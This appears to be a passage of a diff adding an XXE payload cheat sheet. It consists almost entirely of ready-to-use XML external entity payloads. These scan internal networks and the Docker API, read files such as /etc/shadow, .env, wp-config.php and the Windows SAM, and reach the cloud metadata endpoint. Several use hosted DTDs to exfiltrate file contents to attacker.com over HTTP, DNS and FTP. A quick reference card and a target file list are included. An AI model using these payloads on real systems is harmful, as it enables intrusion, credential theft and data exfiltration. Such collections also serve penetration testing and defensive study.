+<!DOCTYPE docker [
+<!ENTITY containers SYSTEM "http://localhost:2375/containers/json">]>
+<docker>&containers;</docker>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE docker [
+<!ENTITY version SYSTEM "http://localhost:2375/version">]>
+<docker>&version;</docker>
+
+================================================================================
+[11] XXE - INTERNAL NETWORK SCANNING
+================================================================================
+
+# SUBNET SCANNING (Class C)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY host1 SYSTEM "http://192.168.1.1:80/">
+<!ENTITY host2 SYSTEM "http://192.168.1.2:80/">
+<!ENTITY host3 SYSTEM "http://192.168.1.3:80/">
+<!ENTITY host4 SYSTEM "http://192.168.1.4:80/">
+<!ENTITY host5 SYSTEM "http://192.168.1.5:80/">]>
+<scan>&host1;&host2;&host3;&host4;&host5;</scan>
+
+# COMMON INTERNAL SERVICES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY jenkins SYSTEM "http://localhost:8080/">
+<!ENTITY grafana SYSTEM "http://localhost:3000/">
+<!ENTITY kibana SYSTEM "http://localhost:5601/">
+<!ENTITY prometheus SYSTEM "http://localhost:9090/">
+<!ENTITY redis SYSTEM "http://localhost:6379/">]>
+<scan>&jenkins;&grafana;&kibana;&prometheus;&redis;</scan>
+
+# DATABASE DISCOVERY
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY mysql SYSTEM "http://localhost:3306/">
+<!ENTITY postgres SYSTEM "http://localhost:5432/">
+<!ENTITY mongodb SYSTEM "http://localhost:27017/">
+<!ENTITY elastic SYSTEM "http://localhost:9200/">
+<!ENTITY memcached SYSTEM "http://localhost:11211/">]>
+<scan>&mysql;&postgres;&mongodb;&elastic;&memcached;</scan>
+
+================================================================================
+[12] XXE - LOCAL FILE DISCOVERY
+-------------------------------------------------------------------------------
+
+# LINUX FILE DISCOVERY
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE discover [
+<!ENTITY passwd SYSTEM "file:///etc/passwd">
+<!ENTITY shadow SYSTEM "file:///etc/shadow">
+<!ENTITY hosts SYSTEM "file:///etc/hosts">
+<!ENTITY hostname SYSTEM "file:///etc/hostname">
+<!ENTITY issue SYSTEM "file:///etc/issue">
+<!ENTITY osrelease SYSTEM "file:///etc/os-release">
+<!ENTITY debian SYSTEM "file:///etc/debian_version">
+<!ENTITY redhat SYSTEM "file:///etc/redhat-release">
+<!ENTITY lsb SYSTEM "file:///etc/lsb-release">
+<!ENTITY group SYSTEM "file:///etc/group">
+<!ENTITY sudoers SYSTEM "file:///etc/sudoers">]>
+<discover>&passwd;&shadow;&hosts;&hostname;&issue;&osrelease;&debian;&redhat;&lsb;&group;&sudoers;</discover>
+
+# APPLICATION CONFIGURATION FILES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE configs [
+<!ENTITY apache SYSTEM "file:///etc/apache2/apache2.conf">
+<!ENTITY nginx SYSTEM "file:///etc/nginx/nginx.conf">
+<!ENTITY phpini SYSTEM "file:///etc/php/php.ini">
+<!ENTITY mycnf SYSTEM "file:///etc/mysql/my.cnf">
+<!ENTITY pgconf SYSTEM "file:///etc/postgresql/postgresql.conf">
+<!ENTITY redisconf SYSTEM "file:///etc/redis/redis.conf">
+<!ENTITY mongoconf SYSTEM "file:///etc/mongod.conf">]>
+<configs>&apache;&nginx;&phpini;&mycnf;&pgconf;&redisconf;&mongoconf;</configs>
+
+# SOURCE CODE FILES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE source [
+<!ENTITY index SYSTEM "file:///var/www/html/index.php">
+<!ENTITY config SYSTEM "file:///var/www/html/config.php">
+<!ENTITY env SYSTEM "file:///var/www/.env">
+<!ENTITY wpconfig SYSTEM "file:///var/www/html/wp-config.php">
+<!ENTITY settings SYSTEM "file:///var/www/html/settings.py">
+<!ENTITY webconfig SYSTEM "file:///var/www/web.config">]>
+<source>&index;&config;&env;&wpconfig;&settings;&webconfig;</source>
+
+# WINDOWS FILE DISCOVERY
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE windows [
+<!ENTITY winini SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY systemini SYSTEM "file:///c:/windows/system.ini">
+<!ENTITY hosts SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
+<!ENTITY bootini SYSTEM "file:///c:/boot.ini">
+<!ENTITY sam SYSTEM "file:///c:/windows/system32/config/SAM">
+<!ENTITY security SYSTEM "file:///c:/windows/system32/config/SECURITY">]>
+<windows>&winini;&systemini;&hosts;&bootini;&sam;&security;</windows>
+
+# WINDOWS APPLICATION FILES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE apps [
+<!ENTITY webconfig SYSTEM "file:///c:/inetpub/wwwroot/web.config">
+<!ENTITY appsettings SYSTEM "file:///c:/Program Files/app/appsettings.json">
+<!ENTITY connection SYSTEM "file:///c:/app/connectionStrings.config">
+<!ENTITY env SYSTEM "file:///c:/app/.env">]>
+<apps>&webconfig;&appsettings;&connection;&env;</apps>
+
+#Local file DTD request
+--------------------------------------------------------------------------------
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+
+================================================================================
+[13] XXE - PARAMETER ENTITIES
+================================================================================
+
+# EXTERNAL PARAMETER ENTITY (Basic)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://attacker.com/parameter.dtd">
+%remote;
+]>
+<root>&send;</root>
+
+# PARAMETER ENTITY WITH FILE INCLUSION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<root>&send;</root>
+
+# INTERNAL PARAMETER ENTITY
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % internal "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/data'>">
+%internal;
+]>
+<root>&send;</root>
+
+# PARAMETER ENTITY REDEFINITION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % original SYSTEM "http://attacker.com/original.dtd">
+%original;
+<!ENTITY % override "<!ENTITY &#x25; malicious SYSTEM 'file:///etc/passwd'>">
+%override;
+]>
+<root>&malicious;</root>
+
+================================================================================
+[14] XXE - CDATA ESCAPE PAYLOADS
+================================================================================
+
+# CDATA FOR SPECIAL CHARACTERS (XML format preserved)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd">
+%dtd;
+]>
+<root>&send;</root>
+
+# CDATA WITH OOB EXFILTRATION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+# EXTERNAL DTD FOR CDATA (evil.dtd)
+-------------------------------------------------------------------------------
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%start;%file;%end;'>">
+%payload;
+
+# CDATA WITHOUT EXTERNAL DTD
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY % combined "<!ENTITY &#x25; data '%start;%file;%end;'>">
+%combined;
+]>
+<root>&data;</root>
+
+================================================================================
+[15] XXE - MODERN PARSER BYPASSES
+================================================================================
+
+# XML DECLARATION WITH ENCODING TRICKS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-16BE"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-16LE"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# XML WITHOUT DOCTYPE (Using XInclude)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include href="file:///etc/passwd" parse="text"/>
+</root>
+
+# XINCLUDE WITH ENCODING
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include href="http://169.254.169.254/latest/meta-data/" parse="xml"/>
+</root>
+
+# SVG XXE (If SVG uploaded/processed)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg width="100" height="100">
+<text x="10" y="20">&xxe;</text>
+</svg>
+
+# XSLT XXE
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xsl [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<output>&xxe;</output>
+</xsl:template>
+</xsl:stylesheet>
+
+# SOAP XXE
+-------------------------------------------------------------------------------
+<soap:Body>
+<foo>
+<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><xxx/>]]>
+</foo>
+</soap:Body>
+
+# RSS XXE
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<rss version="2.0">
+<channel>
+<title>&xxe;</title>
+</channel>
+</rss>
+
+# DOCX/XLSX/PPTX XXE (Office Open XML)
+-------------------------------------------------------------------------------
+# Modify [Content_Types].xml or any .xml file inside the archive:
+<!DOCTYPE xxe [<!ENTITY data SYSTEM "file:///etc/passwd">]>
+<root>&data;</root>
+
+# JAR/WAR/EAR XXE (Java Archives)
+-------------------------------------------------------------------------------
+# Modify WEB-INF/web.xml or any XML configuration:
+<!DOCTYPE web-app [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<web-app>&xxe;</web-app>
+
+================================================================================
+QUICK REFERENCE CARD
+================================================================================
+
+BASIC XXE:
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+BLIND XXE (OOB):
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<root>&send;</root>
+
+BLIND XXE (ERROR):
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % error "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%error;
+]>
+<root>&error;</root>
+
+SSRF XXE:
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<root>&ssrf;</root>
+
+BILLION LAUGHS:
+<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;...">]><lolz>&lol9;</lolz>
+
+================================================================================
+TARGET FILES (Common)
+================================================================================
+
+LINUX:
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/os-release
+/etc/issue
+/proc/self/environ
+/proc/self/cmdline
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/www/html/config.php
+/var/www/.env
+
+WINDOWS:
+c:/windows/win.ini
+c:/windows/system.ini
+c:/boot.ini
+c:/windows/system32/drivers/etc/hosts
+c:/inetpub/wwwroot/web.config
+c:/Program Files/app/appsettings.json
+
+================================================================================
+EXTERNAL DTD HOSTING (attacker.com/evil.dtd)
+================================================================================
+
+# Basic OOB
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
+%payload;
+
+# DNS OOB
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://%file;.attacker.com/'>">
+%payload;
+
+# FTP OOB
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com/%file;'>">
+%payload;
+
+# CDATA OOB
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%start;%file;%end;'>">
+%payload;
